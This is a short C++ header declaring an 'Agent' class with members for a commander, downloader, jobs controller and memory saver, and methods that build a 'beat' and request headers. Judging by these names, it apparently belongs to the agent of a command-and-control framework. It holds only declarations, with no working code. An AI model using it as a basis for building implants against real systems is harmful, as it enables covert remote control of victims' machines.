#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Commander.h"

class Commander;

class Agent
{
public:
	AgentInfo*      info;
	AgentConfig*    config;
	Commander*      commander;
	Downloader*     downloader;
	JobsController* jober;
	MemorySaver*    memorysaver;

	Agent();

	void  SetActive(BOOL state);
	BOOL  IsActive();
	LPSTR BuildBeat();
	LPSTR CreateHeaders();
};
